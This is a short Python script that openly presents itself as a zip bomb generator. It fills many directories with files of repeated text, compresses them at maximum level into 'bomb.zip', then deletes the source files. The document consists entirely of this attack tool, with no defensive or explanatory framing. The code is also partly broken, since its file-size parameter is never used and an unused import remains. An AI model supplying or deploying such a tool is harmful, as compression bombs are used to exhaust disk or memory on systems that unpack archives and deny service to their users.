import os
import zipfile
import threading

def create_files(directory, files_to_create, content):
    for i in range(files_to_create):
        with open(os.path.join(directory, f"{i}.txt"), "w") as f:
            f.write(content * 1000)  

def generate_zip_bomb(directory, num_directories, files_per_directory, file_size_mb, content="Zip bomb file."):
    print("Creating zip bomb...")
    if not os.path.exists(directory):
        os.makedirs(directory)
    
    for i in range(num_directories):
        new_dir = os.path.join(directory, str(i))
        os.makedirs(new_dir)
        create_files(new_dir, files_per_directory, content)  

    print("Zip bomb created successfully.")
    print("Creating zip file...")
    # create the zip bomb
    with zipfile.ZipFile("bomb.zip", "w", zipfile.ZIP_DEFLATED, compresslevel=9) as zipf:
        for root, dirs, files in os.walk(directory):
            for file in files:
                zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), directory))

   
    zip_bomb_size = os.path.getsize("bomb.zip") / (1024 * 1024)
    print(f"Size of the zip bomb: {zip_bomb_size:.2f} MB")

    print("Cleaning up...")
    # delete the directory
    for root, dirs, files in os.walk(directory, topdown=False):
        for file in files:
            os.remove(os.path.join(root, file))
        for dir in dirs:
            os.rmdir(os.path.join(root, dir))
    os.rmdir(directory)

if __name__ == "__main__":
    num_directories = int(input("Enter the number of directories: "))
    files_per_directory = int(input("Enter the number of files per directory: "))
    file_size_mb = float(input("Enter the size of each text file (in MB): "))
    content = input("Enter the content of the text file: ")

    generate_zip_bomb("zip_bomb", num_directories, files_per_directory, file_size_mb, content)
